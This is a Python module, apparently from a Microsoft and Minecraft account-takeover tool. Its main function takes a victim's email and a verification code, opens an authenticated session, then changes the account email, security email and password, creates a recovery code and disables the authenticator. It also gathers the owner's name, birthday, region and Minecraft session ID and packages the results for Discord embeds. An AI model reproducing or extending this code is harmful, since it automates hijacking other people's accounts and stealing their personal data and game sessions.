from securing.utils.get_livedata import getLiveData
from securing.utils.polish_host import polishHost
from auth.initial_session import getSession
from securing.utils.secure import secure
from auth.get_msaauth import getMSAAUTH
from securing.build_embeds import buildAccountData
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
    # Handles the data to be displayed in embeds to discord
    
    session = getSession()
    
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    
    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    initialTime = time.time()
    if not msaauth:
        return msaauth
    
    match msaauth:
        case "Recovery":
            print(f"[X] - Account requires account recovery")
            return None
        
        case "Family":
            print(f"[X] - Account is Family Locked")
            account["minecraft"]["name"] = "Child Locked"
            account["microsoft"]["email"] = "Child Locked"
            account["microsoft"]["security_email"] = "Child Locked"
            
        case _:
            await polishHost(session, msaauth)
            account = await secure(session, recovery, account)

    finalTime = (time.time() - initialTime)

    account = await buildAccountData(account, finalTime)
    return account